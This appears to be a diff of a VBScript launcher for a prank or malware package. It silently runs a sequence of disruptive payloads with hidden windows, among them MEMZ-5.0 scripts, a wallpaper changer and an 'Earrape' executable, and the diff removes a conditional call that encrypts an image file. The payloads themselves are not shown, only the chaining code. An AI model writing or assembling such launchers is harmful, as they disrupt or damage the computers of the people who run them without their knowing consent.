@@ -5,9 +5,6 @@ ws.Run "wscript .\Payloads\Wahoo\WahooStart.vbs", 0
 wscript.sleep 2500
 ws.Run "wscript .\Payloads\MEMZ-5.0\Single_MEMZPayloads.vbs", 0
 ws.Run "wscript .\Payloads\Wallpaper\Wallpaper.vbs", 0
-if lol = 1 then
-EncryptFile ".\chara.jpg"
-end if
 wscript.sleep 1500
 ws.Run ".\Payloads\Earrape\Earrape_EXTERNAL.exe", 0
 wscript.sleep 6600
